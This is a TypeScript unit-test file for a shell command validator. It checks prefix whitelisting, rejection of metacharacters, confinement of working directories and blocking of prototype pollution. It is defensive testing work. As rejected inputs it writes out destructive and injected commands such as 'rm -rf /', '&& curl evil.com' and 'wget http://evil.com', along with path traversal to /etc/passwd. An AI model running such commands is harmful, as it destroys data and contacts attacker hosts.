/**
 * Unit tests for command-validator.ts
 * Run with: bun run src/tests/security/command-validator.test.ts
 */

import {
  validateCommand,
  sanitizeCommand,
  validateCwd,
  validateArgs,
  ALLOWED_PREFIXES,
} from '@/lib/security/command-validator'

// Simple test runner
let passed = 0
let failed = 0

function test(name: string, fn: () => void) {
  try {
    fn()
    console.log(`  ✓ ${name}`)
    passed++
  } catch (err) {
    failed++
    console.error(`  ✗ ${name}`)
    console.error(`    ${err instanceof Error ? err.message : String(err)}`)
  }
}

function assertEqual(actual: unknown, expected: unknown, msg?: string) {
  if (actual !== expected) {
    throw new Error(msg || `Expected ${expected}, got ${actual}`)
  }
}

function assertTrue(value: unknown, msg?: string) {
  if (!value) {
    throw new Error(msg || `Expected true, got ${value}`)
  }
}

console.log('Running command-validator tests...\n')

// ==================== validateCommand ====================
console.log('validateCommand:')

test('rejects empty command', () => {
  const result = validateCommand('')
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('required') || result.error?.includes('empty') || result.error === 'Command cannot be empty')
})

test('rejects undefined command', () => {
  const result = validateCommand(undefined as unknown as string)
  assertEqual(result.valid, false)
})

test('rejects command too long (>1000 chars)', () => {
  const longCmd = 'echo ' + 'a'.repeat(996)
  const result = validateCommand(longCmd)
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('length'))
})

test('rejects command with semicolon', () => {
  const result = validateCommand('echo hello; rm -rf /')
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('forbidden'))
})

test('rejects command with pipe', () => {
  const result = validateCommand('echo hello | cat')
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('forbidden'))
})

test('rejects command with && (double ampersand)', () => {
  const result = validateCommand('npm run build && rm -rf /')
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('forbidden'))
})

test('rejects command with $(subshell)', () => {
  const result = validateCommand('echo $(whoami)')
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('forbidden'))
})

test('rejects command with $variable', () => {
  const result = validateCommand('echo $HOME')
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('forbidden'))
})

test('rejects command with redirect >', () => {
  const result = validateCommand('echo hello > file.txt')
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('forbidden'))
})

test('rejects command with backtick', () => {
  const result = validateCommand('echo `whoami`')
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('forbidden'))
})

test('rejects command with && bypass', () => {
  const result = validateCommand('npm run build && curl evil.com')
  assertEqual(result.valid, false)
})

test('accepts valid npm run command', () => {
  const result = validateCommand('npm run build')
  assertEqual(result.valid, true)
  assertEqual(result.sanitized, 'npm run build')
})

test('accepts valid bun test command', () => {
  const result = validateCommand('bun test')
  assertEqual(result.valid, true)
})

test('accepts valid git status command', () => {
  const result = validateCommand('git status')
  assertEqual(result.valid, true)
})

test('accepts valid tsc command', () => {
  const result = validateCommand('tsc --noEmit')
  assertEqual(result.valid, true)
})

test('accepts valid echo command', () => {
  const result = validateCommand('echo hello world')
  assertEqual(result.valid, true)
})

test('accepts valid ls command', () => {
  const result = validateCommand('ls -la')
  assertEqual(result.valid, true)
})

test('accepts valid prisma command', () => {
  const result = validateCommand('prisma db push')
  assertEqual(result.valid, true)
})

test('accepts valid docker ps command', () => {
  const result = validateCommand('docker ps')
  assertEqual(result.valid, true)
})

test('rejects command not in whitelist', () => {
  const result = validateCommand('rm -rf /')
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('not in the allowed list'))
})

test('rejects wget command (not in whitelist)', () => {
  const result = validateCommand('wget http://evil.com')
  assertEqual(result.valid, false)
})

test('rejects ssh command (not in whitelist)', () => {
  const result = validateCommand('ssh user@host')
  assertEqual(result.valid, false)
})

test('trims whitespace from command', () => {
  const result = validateCommand('  echo hello  ')
  assertEqual(result.valid, true)
  assertEqual(result.sanitized, 'echo hello')
})

test('is case insensitive for prefix match', () => {
  const result = validateCommand('NPM run build')
  assertEqual(result.valid, true)
})

// ==================== sanitizeCommand ====================
console.log('\nsanitizeCommand:')

test('removes shell metacharacters', () => {
  const result = sanitizeCommand('echo hello; rm -rf /')
  assertEqual(result.includes(';'), false)
  assertTrue(result.includes('echo hello'))
})

test('trims and limits length', () => {
  const long = 'echo ' + 'a'.repeat(2000)
  const result = sanitizeCommand(long)
  assertEqual(result.length, 1000)
})

// ==================== validateCwd ====================
console.log('\nvalidateCwd:')

test('accepts empty cwd (defaults to process.cwd)', () => {
  const result = validateCwd('')
  assertEqual(result.valid, true)
  assertEqual(result.resolvedPath, process.cwd())
})

test('accepts valid relative path', () => {
  const result = validateCwd('./src')
  assertEqual(result.valid, true)
  assertTrue(result.resolvedPath?.includes('src'))
})

test('rejects path outside project root', () => {
  const result = validateCwd('/etc/passwd')
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('outside'))
})

test('rejects path traversal attempt', () => {
  const result = validateCwd('../../../etc/passwd')
  assertEqual(result.valid, false)
})

test('rejects path with null/undefined', () => {
  const result = validateCwd(null as unknown as string)
  assertEqual(result.valid, true) // defaults to cwd
  assertEqual(result.resolvedPath, process.cwd())
})

// ==================== validateArgs ====================
console.log('\nvalidateArgs:')

test('accepts null args', () => {
  const result = validateArgs(null)
  assertEqual(result.valid, true)
})

test('accepts undefined args', () => {
  const result = validateArgs(undefined)
  assertEqual(result.valid, true)
})

test('accepts primitive args', () => {
  const result = validateArgs('hello')
  assertEqual(result.valid, true)
})

test('accepts safe object args', () => {
  const result = validateArgs({ key: 'value', num: 42 })
  assertEqual(result.valid, true)
})

test('rejects args with __proto__', () => {
  const obj: Record<string, unknown> = {}
  Object.defineProperty(obj, '__proto__', { value: { polluted: true }, enumerable: true })
  const result = validateArgs(obj)
  assertEqual(result.valid, false)
  assertTrue(result.error?.includes('prototype'))
})

test('rejects args with constructor', () => {
  const badObj: Record<string, unknown> = {}
  Object.defineProperty(badObj, 'constructor', { value: { polluted: true }, enumerable: true })
  const result = validateArgs(badObj)
  assertEqual(result.valid, false)
})

test('rejects non-serializable args', () => {
  const circular: Record<string, unknown> = {}
  circular.self = circular
  const result = validateArgs(circular)
  assertEqual(result.valid, false)
})

// ==================== ALLOWED_PREFIXES ====================
console.log('\nALLOWED_PREFIXES:')

test('contains expected prefixes', () => {
  assertTrue(ALLOWED_PREFIXES.includes('npm run'))
  assertTrue(ALLOWED_PREFIXES.includes('bun run'))
  assertTrue(ALLOWED_PREFIXES.includes('git status'))
  assertTrue(ALLOWED_PREFIXES.includes('docker ps'))
})

test('has reasonable number of prefixes', () => {
  assertTrue(ALLOWED_PREFIXES.length >= 20, 'Should have at least 20 prefixes')
})

// ==================== Summary ====================
console.log(`\n${'='.repeat(40)}`)
console.log(`Tests: ${passed} passed, ${failed} failed`)
console.log(`${'='.repeat(40)}`)

if (failed > 0) {
  process.exit(1)
}
